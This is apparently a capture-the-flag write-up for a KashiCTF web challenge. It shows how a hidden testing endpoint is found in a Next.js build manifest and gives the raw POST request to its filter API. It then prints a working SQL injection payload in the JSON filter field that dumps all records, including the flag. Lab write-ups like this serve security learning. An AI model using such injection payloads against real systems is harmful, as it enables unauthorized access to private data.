In sources, in `_next/static`, open the bkat3... folder. 

In the build manifest file, we find a /v2-testing endpoint

On this page we have different filters, with the associated request:
```
POST /api/list-v2 HTTP/1.1
Host: kashictf.iitbhucybersec.in:58459
Content-Length: 20
Accept-Language: en-GB
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://kashictf.iitbhucybersec.in:58459
Referer: http://kashictf.iitbhucybersec.in:58459/v2-testing
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"filter":"Finance"}
```


This chall is a simple SQL injection in the filter value:
`{"filter":"Finance' or 1=1 -- -"}`
gives us
```
{"employee_name":"peter.johnson","request_detail":"Shitty job, I hate working here, I will leak all important information like KashiCTF{s4m3_old_c0rp0_l1f3_w0Gt3b4b}","status":"denied","department":"Logistics","role":"Supply Chain Manager","email":"peter.johnson@corp.com"}
```
